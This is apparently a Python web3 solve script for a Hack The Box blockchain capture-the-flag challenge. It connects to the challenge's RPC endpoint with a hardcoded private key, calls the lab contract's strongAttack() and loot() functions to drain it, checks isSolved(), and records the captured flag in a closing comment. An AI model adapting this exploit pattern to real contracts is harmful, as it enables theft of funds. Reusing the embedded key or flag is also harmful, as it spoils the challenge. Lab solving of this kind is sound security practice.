from web3 import Web3
import json
from web3.gas_strategies.rpc import rpc_gas_price_strategy

PrivateKey = "0x5351b3054b36550274478640a950191ca28632b2d76d8f1b4b067b8e3fca40ae"
Address = "0x008775247F3098D51e4CC6d2773436a72B01a0B3"
TargetContract = "0x14640928E43FA763FF263aD0dBe77cf33E85e3F2"
SetupContract = "0x5f102976998c981fB4A5730E2AC73FD4e09cd2D7"

url = 'http://104.248.166.174:31576/rpc'

w3 = Web3(Web3.HTTPProvider(url))
block_number = w3.eth.block_number
print(block_number)

account_address = Address
balance = w3.eth.get_balance(account_address)
print(balance)

#solcjs --abi --bin Setup.sol #generate .abi .bin
#with open('Setup_sol_Setup.abi','r') as f:
#       abi = json.load(f)

#contract_instance = w3.eth.contract(address=SetupContract, abi=abi)

account_from = {
        'private_key': PrivateKey,
        'address': account_address,
}

#construct_txn = contract_instance.constructor().buildTransaction(
#       {
#               'from': account_from['address'],
#               'nonce': w3.eth.get_transaction_count(account_from['address']),
#	       'value': 1
#       }
#)

#tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
#tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
#tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
'''
with open('Creature_sol_Creature.abi','r') as f:
        abi = json.load(f)
contract_instance2 = w3.eth.contract(address=TargetContract, abi=abi)
construct_txn = contract_instance2.functions.strongAttack(20).build_transaction(
        {
                'from': account_from['address'],
                'nonce': w3.eth.get_transaction_count(account_from['address']),
                'chainId': w3.eth.chain_id,
		#'value' : 1
                #"gasPrice": w3.to_wei(50, 'gwei'),
                #"gas": 21000,
                #"value": w3.to_wei("0", "ether"),
        }
)
tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')
'''
with open('Creature_sol_Creature.abi','r') as f:
        abi = json.load(f)
contract_instance2 = w3.eth.contract(address=TargetContract, abi=abi)
construct_txn = contract_instance2.functions.loot().build_transaction(
        {
                'from': account_from['address'],
                'nonce': w3.eth.get_transaction_count(account_from['address']),
                'chainId': w3.eth.chain_id,
                #'value' : 1
                #"gasPrice": w3.to_wei(50, 'gwei'),
                #"gas": 21000,
                #"value": w3.to_wei("0", "ether"),
        }
)
tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')


with open('Setup_sol_Setup.abi','r') as f:
        abi = json.load(f)

contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
number = contract_instance.functions.isSolved().call()

print(f'The current number stored is: { number } ')

#http://104.248.166.174:31576/flag
#HTB{g0t_y0u2_f1r5t_b100d}
